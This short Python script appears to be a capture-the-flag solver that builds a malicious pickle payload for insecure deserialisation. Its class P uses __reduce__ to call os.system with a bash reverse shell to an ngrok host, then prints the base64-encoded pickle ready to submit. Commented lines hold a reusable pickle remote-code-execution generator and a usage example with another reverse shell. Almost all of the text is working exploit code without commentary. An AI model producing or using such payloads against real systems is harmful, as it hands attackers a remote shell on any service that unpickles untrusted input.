import pickle
import base64
import sys
import os

# a = pickle.loads(base64.b64decode("gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu"))
# print(a.__dict__)

class P(object):
    def __reduce__(self):
        return (os.system,("bash -c '/bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/11161 0>&1'",))

print(base64.b64encode(pickle.dumps(P())))

# COMMAND = sys.argv[1]
# class RCE:
#     def __reduce__(self):
#         import os
#         return (os.system,(COMMAND,))
# print(base64.b64encode(pickle.dumps(RCE())).decode())
# python3 solver.py "bash -c '/bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/16728 0>&1'"